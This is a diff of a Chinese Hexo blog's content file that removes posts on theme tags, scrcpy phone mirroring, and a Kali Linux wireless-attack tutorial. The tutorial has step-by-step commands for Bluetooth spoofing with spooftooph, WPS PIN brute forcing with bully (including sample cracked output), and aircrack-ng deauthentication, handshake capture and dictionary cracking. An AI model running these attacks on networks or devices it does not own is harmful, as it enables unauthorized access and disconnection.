-<h3 id="小号提示块"><a href="#小号提示块" class="headerlink" title="小号提示块"></a>小号提示块</h3><div class="note default"><p>默认 提示块标签</p>
-</div>
-<div class="note default"><p>default 提示块标签</p>
-</div>
-<div class="note primary"><p>primary 提示块标签</p>
-</div>
-<div class="note success"><p>success 提示块标签</p>
-</div>
-<div class="note info"><p>info 提示块标签</p>
-</div>
-<div class="note warning"><p>warning 提示块标签</p>
-</div>
-<div class="note danger"><p>danger 提示块标签</p>
-</div>
-<div class="note red icon-padding"><i class="note-icon fa-solid fa-bolt"></i><p>自定义提示块标签</p>
-</div>
-
-
-<h3 id="Buttons-按钮模块"><a href="#Buttons-按钮模块" class="headerlink" title="Buttons 按钮模块"></a>Buttons 按钮模块</h3><p>不设置任何参数的 <a class="button " href='/' title='按钮'>按钮</a> 适合融入段落中。</p>
-<p>regular 按钮适合独立于段落之外：</p>
-<a class="button  regular" href='https://www.ohevan.com' title='示例博客'><i class='fa-solid fa-play-circle'></i> 示例博客</a>
-<a class="button  regular" href='https://www.ohevan.com' title='示例博客'><i class='fa-solid fa-play-circle'></i> 示例博客</a>
-<p>large 按钮更具有强调作用，建议搭配 center 使用：</p>
-<a class="button  center large" href='https://redefine-docs.ohevan.com' title='开始使用'><i class='fa-solid fa-download'></i> 开始使用</a>
-
-<h3 id="Folding-折叠模块"><a href="#Folding-折叠模块" class="headerlink" title="Folding 折叠模块"></a>Folding 折叠模块</h3><details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>Folding 测试： 点击查看更多 </summary>
-              <div class='content'>
-              <p>啊啊啊啊啊</p><div class="note danger"><p>danger 提示块标签</p></div> <div class="note tip"><p>tip 提示块标签</p></div> 
-              </div>
-            </details>
-
-<h4 id="Folding-折叠模块-颜色列表"><a href="#Folding-折叠模块-颜色列表" class="headerlink" title="Folding 折叠模块-颜色列表"></a>Folding 折叠模块-颜色列表</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ yellow, blue, green, red, orange, pink, cyan, white, black, gray</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Tabs-分栏模块"><a href="#Tabs-分栏模块" class="headerlink" title="Tabs 分栏模块"></a>Tabs 分栏模块</h3><div class="tabs" id="tab-first-unique-name"><ul class="nav-tabs"><li class="tab active"><a class="#first-unique-name-1">First Tab</a></li><li class="tab"><a class="#first-unique-name-2">Second Tab</a></li><li class="tab"><a class="#first-unique-name-3">Third Tab</a></li></ul><div class="tab-content"><div class="tab-pane active" id="first-unique-name-1"><p><strong>This is Tab 1.</strong></p>
-<p>This is Tab 1.</p></div><div class="tab-pane" id="first-unique-name-2"><p><strong>This is Tab 2.</strong></p>
-<p>This is Tab 1.<br>This is Tab 2.</p></div><div class="tab-pane" id="first-unique-name-3"><p><strong>This is Tab 3.</strong></p>
-<p>This is Tab 1.<br>This is Tab 2.<br>This is Tab 3.</p></div></div></div>]]></content>
-      <categories>
-        <category>Hexo学习内容</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali-Linux-Tools-无线攻击-(1)</title>
-    <url>/2023/11/20/6-Kl-tool/</url>
-    <content><![CDATA[<h2 id="Kali-无线攻击介绍"><a href="#Kali-无线攻击介绍" class="headerlink" title="Kali-无线攻击介绍"></a>Kali-无线攻击介绍</h2><p>Kali Linux 攻击分类包含了信息搜集、漏洞分析、Web程序、数据库评估软件、密码攻击、无线攻击、逆向工程、漏洞利用工具集、嗅探&#x2F;欺骗、权限维持、数字取证、报告工具集、Social Engineering Tools(社会工程工具)。一共十三项，本章介绍的是Kali中的无线攻击内容，主要分为蓝牙工具集和无线工具集。</p>
-<h2 id="Kali-linux-8821cu-无线网卡安装"><a href="#Kali-linux-8821cu-无线网卡安装" class="headerlink" title="Kali-linux 8821cu-无线网卡安装"></a>Kali-linux 8821cu-无线网卡安装</h2><p>首先查看usb接口</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsusb</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/14-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>命令刷新软件源缓存</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt update</span><br></pre></td></tr></table></figure></div>
-
-<p>之后更新内核</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt   install    linux-image-amd64   -y   (64位系统执行这条)</span><br><span class="line">$ apt   install    linux-image-686-pae  -y  (32位系统执行这条）</span><br></pre></td></tr></table></figure></div>
-
-<p>更新内核后重启系统以加载新内核</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ reboot</span><br></pre></td></tr></table></figure></div>
-
-<p>安装内核的头文件</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo  apt   install  linux-headers-amd64    -y （64位系统执行这条)  </span><br><span class="line">$ sudo  apt   install  linux-headers-686-pae  -y  (32位系统执行这条)</span><br></pre></td></tr></table></figure></div>
-
-<p>安装相关编译工具</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt   install    build-essential  bc  dkms  git  libelf-dev  -y</span><br></pre></td></tr></table></figure></div>
-
-<p>之后将github上的驱动源头</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/morrownr/8821cu-20210916</span><br></pre></td></tr></table></figure></div>
-
-<p>进入驱动模块目录并安装驱动</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> 8821cu-20210916</span><br><span class="line">$ ./install-driver.sh</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/15-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>最后结果显示</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/16-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<h2 id="蓝牙工具集"><a href="#蓝牙工具集" class="headerlink" title="蓝牙工具集"></a>蓝牙工具集</h2><h3 id="spooftooph-蓝牙设备伪造克隆工具"><a href="#spooftooph-蓝牙设备伪造克隆工具" class="headerlink" title="spooftooph-蓝牙设备伪造克隆工具"></a>spooftooph-蓝牙设备伪造克隆工具</h3><p>克隆并记录蓝牙设计信息生成随机的新蓝牙配置文件，每隔X秒更改蓝牙配置文件指定蓝牙接口的设备信息从扫码日志中选择要克隆的设备.<br>PS:要修改蓝牙适配器，必须以root权限运行spooftooth.<br>Spooftooph提供五种使用模式：</p>
-<p>1、指定NAME，CLASS和ADDR。<br>root @ test：spooftooph -i hci0 -n new_name -a 00：11：22：33：44：55 -c 0x1c010c</p>
-<p>2、随机生成NAME，CLASS和ADDR。<br>root @ test：spooftooph -i hci0 -R</p>
-<p>3、扫描范围内的设备并选择要克隆的设备。（可选）将设备信息转储到指定的日志文件中。<br>root @ test：spooftooph -i hci0 -s -w file.csv</p>
-<p>4、从日志文件加载设备信息并指定要克隆的设备信息。<br>root @ test：spooftooph -i hci0 -r file.csv</p>
-<p>5、每隔x秒在范围内克隆随机设备信息。<br>root @ test：spooftooph -i hci0 -t 10</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i dev [-mstu] [-nac] | [-R] | [-r file] [-w file] </span><br><span class="line"><span class="comment"># -a &lt;address&gt;：指定新的BD_ADDR </span></span><br><span class="line"><span class="comment"># -b &lt;num_lines&gt;：每个要显示的蓝牙配置文件数页面</span></span><br><span class="line"><span class="comment"># -B：对于较小的屏幕禁用横幅（如手机）</span></span><br><span class="line"><span class="comment"># -c &lt;类&gt;：指定新类</span></span><br><span class="line"><span class="comment"># -h：帮助</span></span><br><span class="line"><span class="comment"># -i &lt;开发&gt;：指定接口</span></span><br><span class="line"><span class="comment"># -m：选择在指定多个接口</span></span><br><span class="line"><span class="comment"># -n &lt;名&gt;：指定新名称</span></span><br><span class="line"><span class="comment"># -r &lt;文件&gt;：读入CSV日志文件</span></span><br><span class="line"><span class="comment"># -R：分配随机名称，CLASS和ADDR </span></span><br><span class="line"><span class="comment"># -s：扫描本地区域中的设备</span></span><br><span class="line"><span class="comment"># -t &lt;时间&gt;：克隆设备的时间间隔</span></span><br><span class="line"><span class="comment"># -u：USB延迟。用于重新初始化接口</span></span><br><span class="line"><span class="comment"># -w &lt;file&gt;的交互式延迟：写入CSV日志文件（在必须通过USB时在虚拟化环境中有用。）</span></span><br></pre></td></tr></table></figure></div>
-
-<p>常见使用方式</p>
-<p>1.指定名称、类别和地址</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -n new_name -a 00:11:22:33:44:55 -c 0x1c010c</span><br></pre></td></tr></table></figure></div>
-<p>PS:这里，-a用于指定新地址 -c用于指定新类。</p>
-<p>2.创建一个随机的蓝牙配置文件<br>使用-R参数来分配随机名称、类和地址</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -R</span><br></pre></td></tr></table></figure></div>
-
-
-<p>3.扫码蓝牙设备<br>使用欺骗，我们还可以扫码范围内的设备并选择要克隆的设备<br>-s 参数用于扫码本地区域的设备<br>-w 将用于设备信息的保存在日志文件中</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -s -w file.csv</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/00-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/01-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>在上述example中附件没有蓝牙设备。但是，当运行该命令时，附近的蓝牙设备会出现</p>
-<p>4.从日志文件中克隆设备信息</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -r file.csv</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/02-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/03-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>5.每X秒更改一次蓝牙配置文件<br>指定的时间间隔内更改蓝牙的配置文件或设备信息，使用-t参数运行下列命令：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ spooftooph -i hci0 -t 10</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/04-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>推荐：⭐⭐ 不是非常推荐</p>
-<h2 id="无线工具集"><a href="#无线工具集" class="headerlink" title="无线工具集"></a>无线工具集</h2><h3 id="bully"><a href="#bully" class="headerlink" title="bully"></a>bully</h3><p>描述:是 WPS 穷举法的一个新实现，用 c 语言编写。它在概念上与其他程序相同，因为它利用了 WPS 规范中的(现在众所周知的)设计缺陷。与原始的reaver 代码相比，它有几个优点。其中包括减少依赖项、改进内存和 cpu 性能、正确处理 endianness 以及更健壮的选项集。它运行在 Linux 上，并且是专门为在嵌入式 Linux 系统(OpenWrt 等)上运行而开发的，无论其体系结构如何。<br>必需参数：<br>-b,–bssid macaddr 目标接入点的MAC地址<br>-e,–essid string 接入点的扩展SSID<br>可选参数：<br>-c,–channel N[,N…]AP的信道号或要跳的列表[b &#x2F;g]<br>-i,–index N 启动pin索引（7或8位数字）[自动]<br>-l,–lockwait N 如果AP锁定WPS，则要等待的秒数[43]<br>-o,–outfile file 消息输出文件<br>-p,–pin N 启动pin号(7位或8位)[自动]<br>-s,–source macaddr 源(硬件)MAC地址[探针]<br>-u,–luaLua脚本文件</p>
-<p>在kali下进行的操作<br>首先先确认我们的无线连接及其名称：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ iwconfig</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/18-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>设置你的无线网卡为监听模式<br>也就是有线连接上的混杂模式类似。它能够让我们看到所有广播传递到我们的无线网卡的数据报。<br>我们可以使用工具 Airmon-ng来完成这个任务。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ airmon-ng start wlan0</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/17-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>接下来，我们需要使用Airodump-ng 来查看我们周围的无线AP信息</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ airodump-ng [wifi 网卡的名称]</span><br></pre></td></tr></table></figure></div>
-<p>这样我们就可以看到几个AP </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/19-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>然后将上述步骤内容中查看到的相关信息，填入我们的Bully命令中</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ bully mon0 -b 00:25:9C:97:4F:48 -e Mandela2 -c 9</span><br></pre></td></tr></table></figure></div>
-<p>分解命令<br>mon0： 监听模式下无线网卡名<br>-b： 00:25:9C:97:4F:48<br>-e：Mandela2 AP SSID<br>-c：9是P正在广播的信道</p>
-<p>这些信息都可以在Airodump-ng的界面上找到</p>
-<p>其中，用于实施WPS认证破解的语法格式如下：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ bully --bssid [AP的MAC地址] -c [channel] [interface] -vv</span><br></pre></td></tr></table></figure></div>
-<p>-interface：指定监听的无线网络接口</p>
-<p>-b，–bssid：指定目标AP的MAC地址。</p>
-<p>-c，–channel：指定目标AP工作的信道。</p>
-<p>-vv：显示更详细的信息。</p>
-<p>使用Bully工具破解WPS加密。执行命令如下：</p>
-<div class="note-large red"><div class="notel-title"><p>Bully攻击流程-1</p>
-</div><div class="notel-content"><p>root@daxueba:~#  bully –bssid 14:e6:e4:84:23:7a wlan0mon -c 1<br>[!] Bully v1.1 - WPS vulnerability assessment utility<br>[P] Modified for pixiewps by AAnarchYY(<a class="link"   href="mailto:&#97;&#x61;&#x6e;&#97;&#114;&#99;&#x68;&#x79;&#121;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d;" >&#97;&#x61;&#x6e;&#97;&#114;&#99;&#x68;&#x79;&#121;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>[+] Switching interface ‘wlan0mon’ to channel ‘1’<br>[!] Using ‘00:0f:00:8d:a6:e2’ for the source MAC address<br>[+] Datalink type set to ‘127’, radiotap headers present<br>[+] Scanning for beacon from ‘14:e6:e4:84:23:7a’ on channel ‘1’<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Excessive (3) FCS failures while reading next packet<br>[!] Disabling FCS validation (assuming –nofcs)<br>[+] Got beacon for ‘Test’ (14:e6:e4:84:23:7a)<br>[!] Creating new randomized pin file ‘&#x2F;root&#x2F;.bully&#x2F;pins’<br>[+] Index of starting pin number is ‘0000000’<br>[+] Last State &#x3D; ‘NoAssoc’   Next pin ‘97011347’<br>[!] Received disassociation&#x2F;deauthentication from the AP<br>[+] Rx(M2D&#x2F;M3) &#x3D; ‘NoAssoc’   Next pin ‘97011347’<br>[!] Unexpected packet received when waiting for EAP Req Id<br>[!] &gt;000012002e48000000026c09a000e301000008023a01000f008da6e214e6e48423<br>7a14e6e484237a2000aaaa03000000888e0200008001de0080fe00372a000000010400104a0001101022000107103900107e4f501a655e05fb5360a4a9dcbb71e710140020d60dd09ac834bc24853d62c2603764d495c5922910f1bffe61ad9ba89625295910150020977b1c91a3df55b132817cc9d22e8196e361b6b179ee0fa41124897b2a7667b710050008acd9d60ed01a2236&lt;<br>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘97011347’<br>[!] Received disassociation&#x2F;deauthentication from the AP<br>[+] Rx( Assn ) &#x3D; ‘NoAssoc’   Next pin ‘97011347’</p>
-</div></div>
-
-<p>从输出的信息可以看到，正在尝试暴力破解目标AP的PIN码，当破解成功后，将显示如下类似的信息：</p>
-<div class="note-large red"><div class="notel-title"><p>Bully攻击流程-2</p>
-</div><div class="notel-content"><p>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘98874019’<br>[+] Rx( Assn ) &#x3D; ‘Timeout’   Next pin ‘98874019’<br>[+] Rx(M2D&#x2F;M3) &#x3D; ‘Timeout’   Next pin ‘98874019’<br>[!] Unexpected packet received when waiting for EAP Req Id<br>[!] &gt;00001a002f48000036164fc40500000010028509a000f001000008023a0100e04c<br>81c11014e6e484237a14e6e484237a2000aaaa03000000888e0200008001c80080fe00372a000000010400104a00011010220001071039001078c42434621449aa65f773b8fe1dea5d101400202eea8e7be64d88e401dfa116452edf8427aeb7985af884bd699a5fa0761759c110150020e2ef0681fab497cbb0ca37ca127af08a15c025100757a64cb73fd46c01976913100500081adaf460796cfd38352c6570&lt;<br>[+] Rx(  ID  ) &#x3D; ‘EAPFail’   Next pin ‘98874019’<br>[*] Pin is ‘98874019’, key is ‘daxueba!’<br>Saved session to ‘&#x2F;root&#x2F;.bully&#x2F;14e6e484237a.run’<br>        PIN : ‘98874019’<br>        KEY : ‘daxueba!’</p>
-</div></div>
-
-<p>以上输出信息中可以看到破解出了Test的密码，其中，PIN码为98870419，密钥为daxueba!</p>
-<p>PS：<br>Bully会在3到5个小时内破解出WPS PIN和AP密码。</p>
-<p>推荐：⭐⭐ 不是非常推荐</p>
-<h2 id="蓝牙-无线攻击工具"><a href="#蓝牙-无线攻击工具" class="headerlink" title="蓝牙&amp;&amp;无线攻击工具"></a>蓝牙&amp;&amp;无线攻击工具</h2><h3 id="aircrack-ng"><a href="#aircrack-ng" class="headerlink" title="aircrack-ng"></a>aircrack-ng</h3><p>Aircrack-ng是一款用于无线网络渗透测试的工具，它可以扫描无线网络、捕获数据包、破解密码等。</p>
-<p>个人实验成功的攻击为WAP加密</p>
-<p>首先将无线网卡插入电脑并选择连接虚拟机中的kali</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/05-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>之后输入命令</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ iwconfig</span><br></pre></td></tr></table></figure></div>
-<p>查看无线网卡有没有加载成功，发现存在无线网卡wlan0，目前wlan0没有连接到任何的wifi上，这个Wlan0中没有IP地址就说明它现在不在连接中。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/06-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>激活无线网卡至monitor既监听模式</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0    </span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/07-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>获取当前网络概况:</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0    </span><br></pre></td></tr></table></figure></div>
-<p>其中 wlan0 是监听模式的接口名称</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/08-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>如果说后续不成功建议使用命令</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng check <span class="built_in">kill</span> </span><br></pre></td></tr></table></figure></div>
-<p>删除多余不必要的内容</p>
-<p>airodump-nq命令详解：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ BSSID显示目标网络的MAC地址</span><br><span class="line">$ PWR显示网络的信号强度。数字越高，信号越好</span><br><span class="line">$ Beacons是网络发送的帧，以便广播它的存在</span><br><span class="line">$ <span class="comment">#Data表示数据包的数量或数据帧的数量</span></span><br><span class="line">$ <span class="comment">#/s显示在过去10秒内收集的数据包的数量</span></span><br><span class="line">$ CH显示网络工作的频道</span><br><span class="line">$ ENC显示网络使用的加密。它可以是WEP，OPN，WPA，WPA2CIPHER显示网络中使用的密码</span><br><span class="line">$ AUTH显示网络上使用的身份验证</span><br><span class="line">$ ESSID显示网络的名称</span><br></pre></td></tr></table></figure></div>
-<p>选择目标网络并进行记录信息<br>例如：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/09-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>其中记录其MAC地址以及信道号<br>MAC地址：BSSID: 80:EA:07:A5:09:FF<br>工作信道:CH:11</p>
-<p>启动数据包捕获</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon</span><br></pre></td></tr></table></figure></div>
-<p>其中“[channel]”是目标网络的信道号，“[BSSID]”是目标网络的MAC地址，“capture”是保存捕获数据包的文件名，这个可以进行修改。</p>
-<p>使用以下命令对目标网络进行攻击</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 10 -a [BSSID] wlan0mon</span><br></pre></td></tr></table></figure></div>
-<p>其中，“-0”表示进行Deauthentication攻击，“10”表示发送10个Deauthentication帧，“[BSSID]”是目标网络的MAC地址。</p>
-<p>-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/10-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>在右上角可以看到WPA handshake字样，后面跟着bssid，即为抓到了该无线网的握手包，我们可以使用CTRL+C来停止嗅探握手包。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/11-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>等待一段时间后，Aircrack-ng将会捕获足够的数据包以进行密码破解。</p>
-<p>使用密码本进行密码破解</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w [dictionary-file] capture-01.cap</span><br></pre></td></tr></table></figure></div>
-<p>其中，“[dictionary-file]”是用于破解密码的字典文件名，“capture-01.cap”是捕获的数据包文件名。<br>之后等待结果</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/12-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/Kali-Linux/06-WA/13-kali-WA.jpg"
-                      alt="KL 图片"
-                ></p>
-<p>推荐：⭐⭐ 不是非常推荐</p>
-<h2 id="总推荐指数"><a href="#总推荐指数" class="headerlink" title="总推荐指数"></a>总推荐指数</h2><p>推荐：⭐  不推荐</p>
-]]></content>
-      <categories>
-        <category>Kali-linux</category>
-      </categories>
-      <tags>
-        <tag>Kali-Attack</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1825,90 +1893,81 @@
       </tags>
   </entry>
   <entry>
-    <title>如何在电脑上操作手机</title>
-    <url>/2023/10/16/TP-tool/</url>
-    <content><![CDATA[<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>此应用程序镜像Android设备（视频和音频）连接通过 USB或TCP&#x2F;IP，并允许控制与计算机的键盘和鼠标的设备。它不需要任何root访问，它适用于Linux、Windows和macOS。</p>
-<h2 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a>最后效果</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-Over.jpg"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><p>Android设备至少需要API 21（Android 5.0）。</p>
-<p>API &#x3D; 30（Android 11+）支持音频转发。</p>
-<p>请确保在设备上启用了USB调试。</p>
-<p>在某些设备上，您还需要启用附加选项USB debugging (Security Settings)（该选项与USB debugging不同）用键盘和鼠标来控制它。<br>重新启动设备是必要的一次 此选项被设置。</p>
-<p>注意，在OTG中运行scrcpy不需要USB调试模式。</p>
-<h3 id="1、手机要开启开发者模式"><a href="#1、手机要开启开发者模式" class="headerlink" title="1、手机要开启开发者模式"></a>1、手机要开启开发者模式</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-6.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h3 id="2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB-debugging功能"><a href="#2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB-debugging功能" class="headerlink" title="2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB debugging功能"></a>2、手机在开发者选项中必须要打开USB调试功能或者还需要打开USB debugging功能</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-8.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h3 id="3、需要在手机上允许电脑进行操作"><a href="#3、需要在手机上允许电脑进行操作" class="headerlink" title="3、需要在手机上允许电脑进行操作"></a>3、需要在手机上允许电脑进行操作</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-7.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="官方WiKi"><a href="#官方WiKi" class="headerlink" title="官方WiKi"></a>官方WiKi</h2><div class="note default"><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/Genymobile/scrcpy/wiki</span><br></pre></td></tr></table></figure></div></div>
+    <title>欢迎使用Hexo</title>
+    <url>/2023/09/08/hello-world/</url>
+    <content><![CDATA[<p>欢迎来到 <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! 这是第一篇文档，如果对此有相关疑问请点击 <a class="link"   href="https://hexo.io/docs/" >文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。 如果您在使用Hexo时遇到任何问题，您可以在<a class="link"   href="https://hexo.io/docs/troubleshooting.html" >故障排除 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中找到答案或者你可以直接来问我 <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
+<h2 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h2><h3 id="创建新的帖子"><a href="#创建新的帖子" class="headerlink" title="创建新的帖子"></a>创建新的帖子</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
 
-<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><div class="note default"><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/Genymobile/scrcpy/blob/master/doc/windows.md</span><br></pre></td></tr></table></figure></div></div>
-<p><img  
+<p>更多信息: <a class="link"   href="https://hexo.io/docs/writing.html" >写作 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
